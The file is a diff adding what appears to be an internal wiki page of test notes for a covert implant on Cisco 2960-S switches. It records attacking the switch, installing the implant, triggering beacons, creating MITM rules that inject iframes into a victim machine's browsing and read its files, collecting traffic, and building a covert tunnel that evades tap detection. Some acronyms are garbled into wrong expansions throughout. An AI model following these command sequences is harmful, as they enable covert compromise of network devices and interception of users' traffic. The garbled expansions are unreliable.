@@ -1,0 +1,435 @@
+
+                        Owner: User #71467
+Aquaman-5h-Without-Snooping Test Notes
+Xetron redelivered Aquaman-5h without snooping as an interim solution to EAREnterprise Archive 5244.  Plan is to run through all tests from previous Aquaman-5h testing, as well as verify that the bug from EAREnterprise Archive 5244 is not reproducible.
+Testing Summary
+
+2960S crashes and reloads if show stacks issued during a reinstall of hg (after initial install with leave_behind and uninstall)
+Identified 2 things in show tech that need to be checked
+hg uninstall causes output in show platform tcam util asic all values to change
+remote command all show vtp status - noticed difference in showtech, haven't been able to get consistent results, not sure this is an issue yet
+
+
+Confirmed snoop not enabled and EAREnterprise Archive 5244 no longer observed
+
+Progress / Notes
+
+Run through HG Base Smoke Tests
+Install/Uninstall without leave-behind
+Establish baseline values for clean target device - skipped because we already have that data from previous testing
+IAC attack - successful, received codes were 125, 60, 159 which are in the readme
+Edited target-aliases to use target address 172.31.255.14
+Edited target-aliases to use correct proc_id
+
+
+HG upload - hg_start, left 1s delay between packets
+HG uploaded successfully - result good
+Establish CTCounter Terrorism Session with HG according to readme
+Edit Aquaman-5h.txt hostfile - set listening interface of flux node to eth0 and IP to trigger to 192.168.21.10 (Seeds host)
+Ran ./prep-ct.sh
+Started CutThroat ./cutthroat ilm_hg.so - listening on 443 and trigger windows
+Trigger implant - beacon call_base_back https  172.20.12.22 443 -ii 192.168.21.10 -im 0050.5688.256d -iv 1 -mi 0011.bb89.21c40011.bb89.21c4 is MACApple Operating System address of 192.168.21.1
+
+Successful HG comms
+
+
+Uninstall according to readme
+device uninstall_hg -mp -f - Successful
+Memory back down, no syslog messages, no crash
+
+
+
+
+Install/Uninstall with leave-behind
+Reloaded switch to start with a clean switch
+SSHIAC attack - successful, received codes were in readme
+HG upload - hg_start_leave_behiind  - delay of 1s delay between packets - Successful
+Collected a show tech
+Establish CTCounter Terrorism Session with HG according to readme
+Started CutThroat ./cutthroat ilm_hg.so - listening on 443 and trigger windows
+Trigger implant - beacon call_base_back https  172.20.12.22 443 -ii 192.168.21.10 -im 0050.5688.256d -iv 1 -mi 0011.bb89.21c40011.bb89.21c4 is MACApple Operating System address of 192.168.21.1
+
+Successful HG comms
+
+
+Uninstall according to readme - successful, no anamolies seen
+Did broad on remote - ok
+hg_start to reinstall
+While hg was reinstalling, i typed show stacks on switch - 1s later the switch crashed with the following error:Instruction Access Exception (0x0400)!
+
+Not sure if this was related to entering show stacks whlie hg reinstall taking place or if that was a coincidence
+
+
+Attempt to reproduce the crash
+SSHIAC attack
+Changed interpacket time to 0.1s
+hg_start_leave_behind - successful
+Establish CTCounter Terrorism Session
+Uninstall according to readme - successful, no anamolies seen
+hg_start to reinstallNo show commands entered - successful reinstall
+
+Establish CTCounter Terrorism Session
+Uninstall hg - successful
+SSHIAC attack
+hg_start_leave_behind to reintsall
+this time, enter show stacks during install
+no crashes - output of show stacks does show the artifacts, this is a known issue
+
+
+Could not establish comms - reloading switch and going to try to repeat again
+Reloaded switch
+SSHIAC attack
+hg_start_leave_behind
+Establish CTCounter Terrorism session
+device hg_uninstall -mp -f
+hg_start_leave_behind - i entered show stacks during install and it crashed again
+
+
+
+
+Command and Control
+Establish CTCounter Terrorism session and verify versions/capabilities
+Reload switch to start with clean target
+SSHIAC attack
+hg_start
+Established CTCounter Terrorism session
+ilm show - ilm version 3.8.0
+device get_uid - 1ce85d68a280
+beacon show - beacon not enabled for this op
+capability show -v 
+baseline version 3.3.0
+lists all modules
+
+
+
+
+Basic command and control
+module show - modules running
+module stop Trigger - success
+module start Trigger.mod - success
+ilm refresh - success
+module show - success - Trigger module running
+
+
+Hit tab key to verify output of available commands
+mitm present, collect present
+dns show, web show, https show - startup delay set to 32850k days - no snoop
+dns get_snooped_host_list_client 0 100 - no snooped hosts even though seeds running
+
+
+Boundary TestRun through list in HG Base Smoke Test Procedure - all failed gracefully, did not attempt to start snoop
+
+
+
+CI Profile
+Collect output for comparison - collected output in new files, will compare to previous test output
+29.66712 MB more Used memory with HG installed
+Observed same spikes in CPU during SSHIAC attack, HG upload and SSLSecure Socket Layer handshake as observed in previous testing
+No change to file system
+Show tech - observed known show stacks and show controllers artifacts
+Show tech after hg uninstall - output of show tech platform tcam util asic all has a higher number for one value - IPv4 security aces went from 36 to 284 for ASIC 0 and ASIC 1 
+Show tech with hg - no output for remote command all show vtp status, whereas there is output for without hg and after hg uninstall.  need to test this further.
+
+
+
+Added to Rancid and ran once with HG, then uninstalled hg, reloaded switch, and ran rancid again to compare
+RANCID rev 1.3 with HG, rev 1.5 without - no differences
+
+
+SMITE Smoke Test - following documented HG 3.3.0 SMITE Capability Smoke Test Procedure
+Start with a clean, reloaded 2960-S
+SSHIAC attack and HG install
+Established CTCounter Terrorism session
+Completed module control test - stop, start - did not complete module delete and reload test
+Did not test module persistence
+Created SMITE rule
+Iframe is injected into web page, viewed in source URL
+Able to attach in Windex and view secrets.txt
+Deleted mitm rule - iframe no longer injected
+
+
+Samsonite Test Case - Uninstall HG and re-attack
+Reloaded 2960-S to start with a clean target device
+Attacked with SSHIAC, installed HG and established comms
+Attempted uninstall hg command device uninstall_hg -mp -f - then typed yes to confirm, result success.
+Checked used memory on the target 2960-S and the memory has gone back to down normal level without HG installed (may be slight difference, need to do the math), no syslog messages, no CPU spike
+Re-attacked using SSHIAC, installed HG, established HG comms - no anomalies
+Uninstalled HG again using device uninstall_hg -mp -f - no anomalies
+No syslogs
+Used memory back to normal
+
+
+
+
+Samsonite Test Case - Dropped connection during HG install
+Reloaded 2960-S to start with a clean target device
+Attacked with SSHIAC
+Entered hg_start and after just a few chunks were sent, shut int g1/0/11 via console connection on 2960-S to simulate network outage
+ICON-CT reported HG install failed
+No syslog messages from switch
+Used memory still shows higher than it should, but not as high as if HG were installed - 27657488 (b)
+Issued no shut on 2960-S interface g1/0/11 to re-enable the connection
+Entered hg_start on ICON-CT and HG successfully uploaded - used memory after successful install - 30524888 (b)
+
+
+Re-test EAREnterprise Archive 5244
+With HG installed, but no CTCounter Terrorism session, enter service network restart on Seeds host 10x
+Did not see err-disable condition
+Established CTCounter Terrorism session and enter service network restart on Seeds host 10x
+Did not see err-disable condition
+
+
+Samsonite Test Case - Attempt to install HG when HG already installed
+Cannot initiate hg_start again via remote - reports comms failure
+Attempted to re-attack with SSHIAC - seemed to go through normal SSHIAC install process, however at the end of the install, could not establish comms with remote
+Broad didn't work
+hg_start fails
+
+
+CT session with HG active throughout
+
+
+Samsonite Test Case - Enable MITMMan-In-The-Middle attack rule and execute system administrator commands
+Enabled the SMITE MITMMan-In-The-Middle attack rule in HG
+Performed the following with no anomalies observed
+Cleared log buffer
+Disable/re-enable logging
+Multiple show commands - show vlan, mac-address table, memory, proc cpu, proc cpu hist, log,run
+Write mem
+Add/delete a user
+Add/delete a VLAN
+
+
+Verified that SMITE works by web browsing from Victim VMVirtual Machine - collected output from Wireshark running on Victim VMVirtual Machine which shows Iframe
+
+
+Samsonite Test Case - Issue Cisco "test crash" command to test crash and generate a crashinfo
+With HG installed, issued test crash and selected reason as software forced crash
+Saved output of crashinfo file
+Saved log messages seen upon reboot of switch in log buffer
+Memory used had returned to normal levels for no HG
+
+
+Without HG installed, repeated test crash - need to compare crashinfo
+Issued "test crash" command with software forced crash as reason
+Saved output of crashinfo file
+Saved syslog messages seen up reboot of switch in log buffer - no additional error messages in files
+
+
+
+
+
+ Samsonite Test Case - Perform core dump of 2960-S
+Performed a write core and saved to TFTPFile transfer software server - both before and after HG install with comess
+Also collected a write core from after hg uninstall
+File sizes are exactly the same for the two core dumps
+
+
+Going home - reloaded 2960-S switch right before i left, so it does not have HG.  Tomorrow, need to pick up with Test 32 from original Aquaman Test Notes page - testing smite through dualor tunnel.  HG is still installed on 2960#1, and I made a CTCounter Terrorism session with that one in the bottom left-hand workspace on ICON-CT.  Do not reload that 2960 or remove HG or else we will have to go through the process of modifying the tunnel.ini so that it won't drop tunnel when it detects tap ip active on network.  
+OR, could go back complete Test number 25 - Performance tests, which I had skipped.
+(Test 32 from original test) Trigger and Callback through a HG Tunnel running Aquaman-3h on 2960
+Updated 2960#1 to 12.2(50)SE5 and implanted with Aquaman-3h delivery of HG --> Confirmed switch is running 12.2(50)SE5
+
+Established comms with Aquaman-3h from ICON-CT on port 443 --> Re-established comms with 2960#1
+On Listen window: ilm listen aquaman-3h.txt
+
+On Trigger window: ilm trigger aquamen-3h.txtbeacon call_me_back https 443 -ii 192.168.44.39
+
+Successfull SSLSecure Socket Layer handshake
+
+
+
+Disabled setting in Aquaman-3h HG tunnel which will disable the tunnel if the tap IP becomes active
+Edit hg/config/tunnel.ini and change DetectTAPSrcTraffic=Yes to No
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = Yes
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg tunnel.ini and note in the output that DetectTAPSrcTraffic has been changed to No
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = No
+From Aquaman-3h CutThroat, type file put cfs/000000004B8FAF63.cfg default:000000004B8FAF63.cfg in order to load the new setting up to HG
+
+From Aquaman-3h CutThroat, type module restart default:CovertTunnel.mod to restart the moduleThis did not work initially and Xetron is aware of this problem.  To fix, try restarting again, and run ilm refresh.
+
+
+
+Establish Dualor tunnel with tap IP 192.168.0.110
+From /hg/tools/dualor/linux, run ./Dualor ../config/dualor-endpoint.ini and note that you get a message that CTCounter Terrorism is listening on port 444
+From Aquaman-3h CutThroat, run tun init tools/dualor/config/dualor-callback.ini and note that the SSLSecure Socket Layer session establishes
+Note that on ICON-CT VMVirtual Machine you know have a new interface called tap0 with an iP 192.168.0.110
+
+
+Add a route to ICON-CT for 192.168.21.0/24 to use tap0 interface - route add -net 192.168.21.0/24 dev tap0
+Move to Aquaman-5h setup - Edit aquaman-5h.txt Interface value under general settings to tap0, and set CommsH port to 445
+Establish HG comms using "beacon call_base_back https 192.168.0.110 445 -ii 192.168.21.10 -im 0050.5688.256d -iv 1 -mi 0011.bb89.21c4"
+Comms successfully established through Aquaman-3h tunnel
+Configured mitm rule for SMITE as in tests above and successfully exploited Victim VMVirtual Machine and read secrets.txt from Windex
+Viewed web page source code which showed the iframe with promo code.
+Deleted MITMMan-In-The-Middle attack rule. Issued "mitm show" to confirm rule is deleted
+Moved to Aquaman-3h screens. In Listen window, issued "tun show" to get tunnel ID. Then issued "tun close 7" with success. "tun show" command confirms no active tunnels. Issued "ifconfig" in a terminal to confirm "tap 0" interface is gone.
+Edited ..aquaman-5h/hg/aquaman-5h.txt file to change interface back to "eth0" and port back to "443"
+
+
+Samsonite Test Case - Create MITMMan-In-The-Middle attack rule for SMITE multiple times
+Establish CTCounter Terrorism Session
+Created the MITMMan-In-The-Middle attack rule twice in a row - command successful both times and two identical rules present in mitm show output
+Created a third identical MITMMan-In-The-Middle attack rule - now there are three identical MITMMan-In-The-Middle attack rules - mitm show
+Iframe injection on Victim VMVirtual Machine successful - only 1 Iframe injected
+mitm status shows 1 session affected
+Deleted the two additional rules and added a rule with same filter settings except different iframe string - only one iframe injected and it is for lowest numbered rule
+Deleted the lowest numbered rule so now only 1 rule applied - iframe is injected that matches remaining rule
+Noticed that in our test setup HTMLHypertext Markup Language we have two body tags, and we actually get two iframes injected - one after each body tag, which results in two shellterm connection ids in Windex
+When multiple MITMMan-In-The-Middle attack rules are present for the same traffic, lowest numbered rule is the action performed
+
+
+Samsonite Test Case - Reload FilterBroker.mod while mitm rule enabled
+Created a mitm rule and verified functionality by viewing source on the Victim VM
+On CutThroat session, entered module restart default:FilterBroker.mod
+Issued module show and saw two copies running - one status ModuleStopped, one status ModuleRunning
+Issued ilm refresh to attempt to clear the old copy of FilterBroker - however two copies still present in module show
+Ran mitm show and found no rules - restarting the module had deleted our rule
+Re-added a mitm rule and verified functionality by checking for the Iframe on Victim VM
+Checked module show and found that now, only one copy - status ModuleRunning - is present
+
+
+
+Smoke Test - Collect Capability
+Establish CTCounter Terrorism Session with HG
+Collect create 192.168.21.10 255.255.255.0 0 65535 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 0 65535 tcp -en
+This rule captures Seed traffic
+In Listen window, observed "collect success received collected data" messages with job numbers
+Collect status showed active sessions and captured sessions
+Typed collect disable 8 to disable the collection rule
+Collect status showed 0 bytes buffered
+Viewed collected data in /Logs by converting to PCAPPacket capture format with ExfilParsh.sh - saw our seeds data
+
+
+Samsonite Test - Reload 2960-S during HG install
+Reloaded target 2960-S to start with a clean target device
+Attacked with SSHIAC
+Initiated HG install and reloaded the switch 18% complete
+Did not see any unusual syslog messages, switch boots normally
+Remote reports "FAILED retry (yes/up/down/fail)?  Selected fail and remote gives ERROR CODE 1.
+Re-attack with IACInternational Access Code - successful and looks normal
+Initiated HG install and allow installation to complete - Installation successful
+Established HG comms successfully
+device uninstall_hg -mp -f
+
+
+
+Smoke Test - socket get_arp_survey_data
+Reload switch to start with a clean Target Device
+SSHIAC attack and install HG
+
+Establish CTCounter Terrorism session
+
+type socket get_arp_survey_data - results show 2 entries from our network (192.168.21.10 and 192.168.21.1), and show vlan 1
+Tried to get more entries to show up by sending pings to and  from the Victim VMVirtual Machine (192.168.21.11) however no new ARPAddress Resolution Protocol entries
+socket get_arp_responder_status shows ARPAddress Resolution Protocol responder enabled Yes
+socket clear_arp_survey_data
+
+Checked socket get_arp_survey_data again and only 1 entry now, eventually both re-appeared
+
+
+
+
+IXIA Testing
+
+With HG still loaded on 2960-S from last Friday, ran pre-defined test with a a mix of traffic at 75mbps rate.
+(Test 1) Results = 715,397 attempted / 658,078 successful / 0 failed under "Application Transaction Rate". 2960-S CPU topped out at 11%
+(Test 2) Results = 715,867 attempted / 658,041 successful / 0 failed under "Application Transactions". 2960-S CPU topped out at 10%
+
+
+
+Reload 2960-S so that HG is NOT installed
+(Test 1) Results = 715,423 attempted / 658,228 succesful / 0 failed under "Application Transactions". 2960-S CPU topped out at 11%
+(Test 2) Results = 715,457 attempted / 658,159 successful / 0 failed under "Application Transactions". 2960-S CPU topped out at 10%
+
+
+
+
+
+Show stacks crash investigation
+Reload switch
+SSHIAC attack
+hg_start_leave_behind
+Establish CTCounter Terrorism Session
+device uninstall_hg -mp -f
+During steps a-e, ran show stacks all along the way.  Target Device crashed when show stacks issued during step e (hg uninstall)
+
+
+
+show stacks crash investigation
+reload switch
+SSHIAC attac
+hg_start_leave_behind
+Establish CTCounter Terrorism session
+device uninstall_hg -mp -f
+After step e was complete, hg_uninstall was completely finished, issued show stacks and the switch crashed
+
+
+show stacks crash investigation - no leave behind option
+reload switch
+sshiac attack
+hg_start
+Establish CTCounter Terrorism session
+device uninstall_hg -mp -f
+During steps a-e, ran show stacks all along the way.  No crashes observed.
+
+
+
+show stacks crash investigation
+reload switch
+sshiac attack
+hg_start_leave_behind
+establish CTCounter Terrorism session
+performed show stacks during all steps, a - d, no crash
+device uninstall_hg -mp -f (did not issue show stacks during this process in order not to crash the target device)
+hg_start_leave_behind (did not issue show stacks during this process in order not to crash the target device)
+after hg install complete, checked memory, hg definitely there.  did a show stacks and it caused a crash.
+
+
+
+
+Previous versions:
+| 1 empty
+| 2 [Xetron]
+| 3 [Xetron]
+| 4 [Xetron]
+| 5 [Xetron]
+| 6 [Xetron]
+| 7 [Xetron]
+| 8 [Xetron]
+| 9 [Xetron]
+| 10 [Xetron]
+| 11 [Xetron]
+| 12 [Xetron]
+| 13 [Xetron]
+| 14 [Xetron]
+| 15 [Xetron]
+| 16 [Xetron]
+| 17 [Xetron]
+| 18 [Xetron]
+| 19 [Xetron]
+| 20 [Xetron]
+| 21 [Xetron]
+| 22 [Xetron]
+| 23 [Xetron]
+| 24 [Xetron]
+| 25 [Xetron]
+| 26 [Xetron]
+| 27 [Xetron]
+| 28 [Xetron]
+| 29 [Xetron]
+| 30 [Xetron]
+| 31 [Xetron]
+| 32 [Xetron]
+| 33 [Xetron]
+| 34 [Xetron]
+| 35 [Xetron]
+| 36 [Xetron]
+| 37 [Xetron]
+| 38 [Xetron]
+| 39 [Xetron]
+| 40 [Xetron]
+| 41 [Xetron]
+| 42 [Xetron]
+|
+                    
